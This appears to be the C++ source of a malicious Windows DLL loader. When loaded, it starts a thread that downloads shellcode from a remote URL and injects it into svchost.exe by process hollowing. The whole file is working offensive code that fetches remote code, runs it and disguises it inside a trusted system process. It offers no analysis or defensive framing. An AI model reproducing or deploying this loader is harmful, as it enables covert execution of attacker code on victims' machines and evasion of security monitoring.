#include "include/include.h"
#include "include/injection/process_hallowing.h"

std::string DownloadShellcode() {
    HINTERNET hInternet = InternetOpen(reinterpret_cast<LPCSTR>("MyAgent"), INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    HINTERNET hConnect = InternetOpenUrl(hInternet, reinterpret_cast<LPCSTR>("https://example.com/shellcode.b64"), nullptr, 0, INTERNET_FLAG_SECURE, 0);

    char buffer[1024];
    DWORD bytesRead;
    std::string result;

    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        result.append(buffer, bytesRead);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return result;
}

void exec() {
    std::string downloadedShellCode = DownloadShellcode();
    if (downloadedShellCode.empty()) {
        PRINT("Failed to download shellcode, buffer empty", PRINT_ERROR);
        return;
    } else {
        PRINT("Downloaded shellcode", PRINT_DEBUG);
    }

    std::vector<BYTE> shellcode(downloadedShellCode.begin(), downloadedShellCode.end());

    char systemPath[MAX_PATH];
    if(!GetSystemDirectoryA(systemPath, MAX_PATH)) {
        PRINT("Failed to get the system directory.", PRINT_ERROR);
    }
    char svchostPath[MAX_PATH];
    if (S_OK != StringCchPrintfA(svchostPath, MAX_PATH, "%s\\svchost.exe", systemPath)) {
        PRINT("Failed to build the svchost path.", PRINT_ERROR);
    }

    CreateHollowProcess(svchostPath, shellcode);
}

void run() {
    PRINT("Starting main thread", PRINT_INFO);
    std::thread runThread(exec);
    runThread.detach();
}

BOOL APIENTRY DllMain(  HMODULE hModule,
                        DWORD  ul_reason_for_call,
                        LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
#ifdef DEBUG
            RunConsole();
#endif
            run();
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
#ifdef DEBUG
            StopConsole();
#endif
        break;
    }
    return TRUE;
}

